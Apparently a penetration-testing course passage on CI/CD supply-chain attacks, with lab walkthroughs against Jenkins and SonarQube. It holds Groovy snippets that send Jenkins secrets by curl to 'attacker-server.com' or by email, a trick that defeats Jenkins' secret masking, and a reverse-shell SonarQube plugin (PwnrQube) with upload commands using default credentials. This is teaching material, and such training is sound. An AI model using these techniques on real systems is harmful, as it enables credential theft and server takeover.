An overhaul of the `code-signing policy`, fortified by stringent controls, could act as a formidable barrier against the misuse of digital certificates, even if an intruder gains initial access. Innovative solutions like `AI-based anomaly detection systems` could provide proactive security by identifying unusual patterns in server access, file modifications, and update distributions. Such a system might have flagged the anomalous behaviour exhibited in the `ShadowHammer attack`, such as the targeted `MAC addresses`.

In conclusion, `Operation ShadowHammer` is an exemplary `supply chain attack`, characterised by its exploitation of a trusted update mechanism, use of valid `digital signatures`, targeted nature, exploitation of a major manufacturer's `supply chain`, and overall complexity.

This incident highlights the need for `heightened security measures in direct systems and across the entire supply chain`, recognising the interconnectedness and potential vulnerabilities that can be exploited in today's digital landscape.


# DevOps Not-So-Secrets

* * *

`DevWorks`, a London-based `software development` company, specialises in `DevOps` and `Continuous Integration` solutions. Established in 2015, the firm has rapidly built a reputation for expediting software deployment cycles for many clients, including startups and `FTSE 100` companies.

Recently, `DevWorks` has partnered with `HealthMate` to enhance and manage the `Continuous Integration` and `Deployment` pipeline of `HealthMate`'s `EHR` system. This collaboration involves utilising `Jenkins`, an `open-source automation server`, to streamline the release process of `HealthMate`'s `EHR` software.

As a professional pentester, you initially targeted `HealthMate's` systems as an attacker but encountered formidable cybersecurity defences. Subsequently, your focus shifted to `DevWorks`, `HealthMate's` recent partner.

Employing `OSINT` and `social engineering` tactics, you persuaded a `DevWorks` junior developer to experiment with pirated software that promised enhanced development speed. Unbeknownst to the developer, the software contained a hidden `keylogger`. This reckless action inadvertently gave you critical access to `DevWorks`' infrastructure, including the developer's login credentials for various `DevWorks` resources, notably `Jenkins`.

You will need to set up the below vhosts in your hosts file, remember to change the IP to your target instance IP.

```shell
sudo tee -a /etc/hosts <<EOF
10.129.229.91 gitea.inlanefreight.local
10.129.229.91 jenkins.inlanefreight.local
EOF

10.129.229.91 gitea.inlanefreight.local
10.129.229.91 jenkins.inlanefreight.local

```

## DevOps Secrets

The `Build and Integration` stage is central for merging various code segments into a cohesive software product. `Jenkins`, a renowned `CI/CD` tool, plays a pivotal role in automating this process. However, this automation introduces potential vulnerabilities, compromising the software supply chain. A notable threat is the deliberate exposure of `secrets`.

In software development, `secrets` refer to sensitive data such as `API keys`, `passwords`, and other credentials. These crucial elements allow access to databases, servers, and other vital resources. Inadequate management of these secrets can lead to unauthorised access, representing a significant security risk.

`Secret leakage` typically occurs in two forms:

1. `Insecure Storage`: Developers may store secrets in unencrypted text files or insufficiently secured databases. This method of storage can easily expose sensitive information to attackers.
2. `Insecure Transfer`: During the `CI/CD` process, these secrets might be transmitted via non-secure channels. This occurs both in different stages of the build process and among team members. Transferring secrets without robust encryption makes them vulnerable to interception.

Deliberate secret exposure is categorised as a " `Secrets Leakage`" attack, particularly relevant to the `Build and Integration` stage. When an attacker can alter a `Jenkinsfile`, they can purposefully reveal secrets used in the build process. This form of attack is especially harmful, as these secrets often provide access to various software stack components, from source code repositories to production environments. An example would be an attacker modifying the `Jenkinsfile` to log or externally transmit a database password.

Given the extensive permissions often granted to `Jenkins`, leaked secrets can act as a "golden ticket" for attackers to further compromise the software infrastructure. The impact can be catastrophic if the `CI/CD` pipeline automatically deploys code to production, potentially allowing the attacker to deploy harmful code.

- `Compromised Software`: The exposed secrets could compromise the software under development, effectively tainting the supply chain.
- `Rapid Propagation`: The automated nature of `CI/CD` pipelines means that a compromised build could swiftly reach many users.

## Jenkins

`Jenkins` often necessitates access to sensitive data. This includes `API tokens`, `passwords`, `SSH keys`, and other credentials.

The storage of secrets in `Jenkins` is managed through the [Credentials Plugin](https://plugins.jenkins.io/credentials/), providing a secure, centralised repository for various types of sensitive information. Once inputted, these credentials undergo encryption and storage on the `Jenkins master server`, thus safeguarding them from unauthorised access.

`Jenkins` also offers a versatile scoping mechanism for these stored credentials. You can designate them globally, allowing access to all jobs and users with appropriate permissions or even to particular projects. This flexibility proves beneficial for categorising credentials based on specific criteria, such as URLs.

### withCredentials

The `withCredentials` feature in Jenkins is specifically designed for securely handling sensitive information, such as passwords, API keys, and SSH keys, within a CI/CD pipeline.

Imagine you have a Jenkins pipeline that automates the process of building, testing, and deploying an application to a remote server. To access this remote server, you require SSH credentials. Storing these credentials in plain text within the `Jenkinsfile` or source code is insecure and highly discouraged. Instead, you can use the `withCredentials` feature to inject the SSH credentials defined in the `Credentials Plugin` only when they are needed securely.

```groovy
pipeline {
    agent any

    stages {
        stage('Build') {
            steps {
                // Build steps
            }
        }

        stage('Test') {
            steps {
                // Test steps
            }
        }

        stage('Deploy') {
            steps {
                withCredentials([sshUserPrivateKey(credentialsId: 'mySSHKey', keyFileVariable: 'SSH_KEY')]) {
                    sh '''
                        scp -i $SSH_KEY my-app.jar user@remote-server:/path/to/deploy/
                    '''
                }
            }
        }
    }
}

```

In this example, the SSH private key is stored securely within Jenkins and is identified by the `credentialsId` 'mySSHKey'. The `withCredentials` step temporarily provides the private key as a file whose path is stored in the `SSH_KEY` environment variable. This file exists only for the duration of the `withCredentials` block.

### withCredentials Leakage

While the `withCredentials` feature in Jenkins is designed to handle secrets securely, it can also be exploited to leak sensitive information if misused or manipulated intentionally. This is especially concerning when an insider threat or an attacker with access to the Jenkinsfile exists.

The `withCredentials` function binds credentials to variables within a specific block of a Jenkins pipeline script. These variables are available only within this block and are cleared after the block has been executed. However, these variables can be intentionally logged, printed, or transmitted to expose the credentials. For example:

```groovy
withCredentials([string(credentialsId: 'sensitive-secret', variable: 'SENSITIVE_SECRET')]) {
    sh 'echo "Leaking the secret: $SENSITIVE_SECRET"'
}

```

In this example, the `SENSITIVE_SECRET` is intentionally printed to the console, making it visible in the Jenkins build logs.

Here are some common methods an attack can abuse `withCredentials ` to disclose secrets:

1. `Console Logging`: The most straightforward method is to log the secret to the Jenkins console, as shown in the example above. Anyone accessing the Jenkins build logs can see the secret in plain text.

2. `Transmitting to External Server`: A more covert method would be to send the secret to an external server controlled by the attacker. This could be done using `curl` or any other method to transmit data over the network.


```groovy
withCredentials([string(credentialsId: 'sensitive-secret', variable: 'SENSITIVE_SECRET')]) {
       sh 'curl -d "secret=$SENSITIVE_SECRET" https://attacker-server.com'
}

```

3. `Email Exposure`: The secret could be emailed to an external email address, likely raising more immediate red flags. However, it’s a viable option if other methods prove fruitless and email has been set up.


```groovy
withCredentials([string(credentialsId: 'sensitive-secret', variable: 'SENSITIVE_SECRET')]) {
       emailext (
           to: '[email protected]',
           subject: 'Leaked Secret',
           body: "Here is the secret: ${env.SENSITIVE_SECRET}"
       )
}

```


## Let’s disclose some secrets

### Gitea

You have access to the `app1` git via Gitaea, hosted on the `:3000` port of the target system. Having a keylogger, you know your targeted developer’s Gitea login is `htb-stdnt:Test@123`.

![](https://academy.hackthebox.com/storage/modules/243/gitea.png)

### Jenkins

Your keylogger also revealed the Jenkins credentials `admin:c235899364c147f0ad586c4408b18765`.

![](https://academy.hackthebox.com/storage/modules/243/jenkins.png)

The first thing we need to do is find the secret we are looking for. If we go to the user settings for `admin`, there is a settings menu that lists `Credentials`. There, we can see the variable `flag2` that we must extract. Jenkins has some built in protections that prevent us from retrieving the actual value of `flag2` from the `Credentials` menu; we can only `update ` the value with a new one, `delete ` the value, or `move ` it to a different scope.

![](https://academy.hackthebox.com/storage/modules/243/jenkins-credentials.png)

### Jenkinsfile

Returning to Gitea, we can now edit the `Jenkinsfile` to extract the secret. We are going to log it to the console. Commit the changes.

```groovy
pipeline {
    agent any

    stages {
        stage('Install_Requirements') {
            steps {
            	echo 'Installing Requirements..'
                script {
                    withCredentials([string(credentialsId: 'flag', variable: 'flag')]) {
                        print 'flag=' + flag
            			print 'flag.collect { it }=' + flag.collect { it }
                    }
                }
            }
        }

        stage('Build') {
            steps {
                echo 'Building..'
            }
        }
        stage('Test') {
            steps {
                echo 'Testing..'
            }
        }
        stage('Deploy') {
            steps {
                echo 'Deploying....'
            }
        }
    }
}

```

The `withCredentials` step retrieves secrets from Jenkins' built-in credentials store. In this case, it's fetching a string credential with the ID `flag` and assigning its value to the variable `flag`.

The next two lines print the secret to the console:

- `print 'flag=' + flag` – This attempts to print the value of the `flag ` secret directly.
- `print 'flag.collect { it }=' + flag.collect { it }` – This is a Groovy way of iterating over each string character and collecting it into a list. Jenkins has some mitigations to prevent a 1:1 printing of secrets in the console log. Whereas, if we retrieve each character as a list, it will break that mitigation.

Revert to Jenkins and navigate to the `Console Output` of the most recent build, and we can see the above two prints in the log.

![](https://academy.hackthebox.com/storage/modules/243/jenkins-build.png)

We can see where Jenkins has attempted to prevent a secret leak on `print 'flag=' + flag`, where it replaced the value with `*****`; however, as stated above, the `flag.collect` function bypasses this mitigation and returns a list of individual characters that form the value of `flag`. The output looks like a base64 encoded string, so converting it gives us the value.

```shell
echo 'SFRC......' | base64 --decode

HTB{...}

```


# Testing the Tester

In software development, the `Testing` stage is a pivotal juncture where code is scrutinised for functionality and security. While this stage aims to be a bulwark against poor quality and vulnerabilities, its susceptibility to security risks often goes unnoticed.

`SonarQube` is an open-source platform employed for continuous inspection of code quality. It automates reviewing code to detect bugs, vulnerabilities, and code smells that may undermine the quality of software projects. The software supports more than 25 programming languages, providing a comprehensive view of code quality and aiding developers in identifying and rectifying issues early in the software development lifecycle.

The modus operandi of `SonarQube` involves scanning source code for various metrics and characteristics, such as complexity, duplicated lines of code, potential bugs, and so forth. The tool integrates seamlessly with build systems and continuous integration pipelines, such as `Jenkins`, to provide real-time feedback to developers.

After the code is scanned, `SonarQube` offers a dashboard that analyses issues and metrics, making it convenient for teams to assess and improve code quality.

As beneficial as `SonarQube` enhances software quality, it can also be exploited as part of a supply chain attack.

One of the cornerstones of `SonarQube`'s functionality is its rule-based engine, which checks code against predefined rules for quality and security. Attackers who gain access to `SonarQube` could tamper with these rules. For instance, they could disable rules that flag insecure coding practices, creating a blind spot for vulnerabilities.

An attacker could also use their access to `SonarQube` to inject malicious code snippets directly into the codebase. Since `SonarQube` often has a level of trust within an organisation, developers might overlook or dismiss warnings about these changes, assuming they are false positives or benign. This malicious code could then serve as a backdoor, data exfiltration mechanism, or any other type of exploit, thus compromising the security of the end product.

`SonarQube` sometimes flags sections of code that handle sensitive information, like passwords or API keys, as part of its security code reviews. An attacker accessing `SonarQube` could extract this information for nefarious purposes, including unauthorised access to other systems or data breaches.

It may also be possible to exploit `SonarQube` directly to access the server itself, opening the door to manipulated test results or data theft and to complete server compromise. This could facilitate lateral movement within the network, exponentially magnifying the supply chain attack's scope and impact.

## DevGuard Inc

`DevGuard Inc.` is in the throes of developing `FinSuite`, a next-generation finance software suite with significant market implications. Your ultimate objective is to escalate your privileges from a SonarQube administrator to a server user, thereby gaining unauthorised access to the DevGuard Inc. server and potentially compromising the `FinSuite` project.

They have hired you, a professional pentester, to ensure their systems are secure. During an enumeration of their networks, you discovered a vulnerable `SonarQube` instance within the network of `DevGuard Inc.` This software development company relies on SonarQube for continuous code inspection during the Testing stage of their CI/CD pipeline.

You will need to set up the below vhosts in your hosts file, remember to change the IP to your target instance IP.

```shell
echo "10.129.228.197 sonarqube.inlanefreight.local" | sudo tee -a /etc/hosts

10.129.228.197 sonarqube.inlanefreight.local

```

If we navigate to the vhost, we can now see the SonarQube dashboard, and we can see the exact version in use, `Version 7.8 (build 26217)`

![](https://academy.hackthebox.com/storage/modules/243/sonar-version.png)

We don’t have any prior knowledge of what the SonarQube login is; however, trying the default set of SonarQube credentials, `admin:admin`, worked. DevGuard Inc. must have really been in a rush to leave the default credentials unchanged.

![](https://academy.hackthebox.com/storage/modules/243/sonar-login.png)

### Reverse Shell

This version will be vulnerable to [braindead-sec’s PwnrQube](https://github.com/braindead-sec/pwnrqube) reverse shell plugin. `PwnrQube ` targets a specific vulnerability in SonarQube versions up to 7.9.4. While SonarQube's dashboard only allows administrators to install plugins from its approved marketplace, an API command ( `updatecenter/upload`) permits the upload of any custom plugins.

The core of `PwnrQube ` is a custom-crafted plugin that leverages Java libraries to create a reverse shell. This reverse shell is programmed to connect back to a host controlled by the attacker, providing direct access to the SonarQube server.

After pulling `PwnrQube ` from the git, `cd pwnrqube/totally-benign-plugin` and then edit the `src/main/java/benign.java` file with your host information, mainly your system IP and the port you want the shell to connect on:

```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import static java.util.Arrays.asList;
import org.sonar.api.Plugin;
import org.sonar.api.config.PropertyDefinition;

public class benign implements Plugin {
  @Override
  public void define(Context context) {
    String lhost = "10.10.14.58"; // specify your attack host here
    int lport = 1337;           // specify a listening port here
    try {
      revshell(lhost, lport);
    }
      catch (Exception e){
    }
  }

...

```

The plugin is coded in Java, and we can see there is a `pom.xml` file in the plugin root folder, which means we can use maven to build the plugin, so make sure both an appropriate JDK for your host and Maven are installed: `sudo apt install openjdk-11-jdk maven -y`

```shell
ls -la

drwxr-xr-x 3 htb-ac561 htb-ac561 4096 Nov  1 12:59 .
drwxr-xr-x 4 htb-ac561 htb-ac561 4096 Nov  1 12:59 ..
-rwxr-xr-x 1 htb-ac561 htb-ac561 1729 Nov  1 12:59 pom.xml
drwxr-xr-x 3 htb-ac561 htb-ac561 4096 Nov  1 12:59 src

```

Run `mvn clean package` to clean the target directory containing all of the compiled classes and other build artifacts and then compiles the project's source code and package it into a JAR or WAR file, depending on the project type.

```shell
mvn clean package
[INFO] Scanning for projects...
[INFO]
[INFO] --------------------< benign:totally-benign-plugin >--------------------
[INFO] Building benign 1.0
[INFO] ----------------------------[ sonar-plugin ]----------------------------
...
[INFO] -------------------------------------------------------
[INFO] Building jar: /tmp/pwnrqube/totally-benign-plugin/target/totally-benign-plugin-1.0.jar
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  2.406 s
[INFO] Finished at: 2023-11-01T13:13:42Z
[INFO] ------------------------------------------------------------------------

```

Start a reverse shell, listening on the port you defined above:

```shell
nc -nvlp 1337

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

```

Now, we will attempt to upload our `totally-benign-plugin` onto SonarQube using the API and then restart the server to load the plugin. There won’t be any confirmation of success after the upload, but there won’t be an error.

```shell
curl --user admin:admin -X POST -F file=@target/totally-benign-plugin-1.0.jar http://sonarqube.inlanefreight.local/api/updatecenter/upload

curl --user admin:admin -X POST http://sonarqube.inlanefreight.local/api/system/restart

```

Indication of success, will be netcat catching a connection after SonarQube has restarted

```shell
nc -nvlp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.229.86.
Ncat: Connection from 10.129.229.86:43680.

```

With this reverse shell, we can elevate to a full TTY and then access the `flag.txt` in the user’s folder.


# Skills Assessment

* * *

You are a professional penetration tester hired by `InlaneFreight`, a massive logistics company.

Your task was to assess the security of `InlaneFreight's` IT infrastructure. Despite your extensive experience and expertise, you find that their systems are exceptionally secure, leaving no apparent vulnerabilities to exploit. This initial phase proved mostly unfruitful, only discovering an old server in an unused network that stored old company procedures and old documents.


